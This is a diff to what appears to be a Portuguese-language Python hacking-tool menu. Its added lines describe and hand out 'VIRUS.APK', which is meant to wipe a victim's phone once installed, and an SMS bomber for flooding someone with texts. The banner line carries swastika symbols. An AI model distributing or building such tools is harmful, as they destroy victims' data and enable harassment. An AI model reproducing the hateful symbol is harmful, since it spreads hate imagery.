@@ -153,6 +153,10 @@ l\033[0m\033[1;31m 卐                                           卐 \033[0m\033
           case "5":
                iniciar_SYSTEMNERF()
           case "6":
+               print ('''\033[34m
+O APK VIRUS.APK é um app que quando a vítima instala o mesmo vai apagar tudo do celular dela, e o app sms bomber seve pra enviar vários sms pra pessoa.
+                    \033[0m  ''')
+               OP_PAUSAR = input('\033[33mAPERTE ENTER PARA OBTER OS APKS:\033[0m')
                copiar_app_virusapk()
                copiar_app_smsbomber()
                clear()
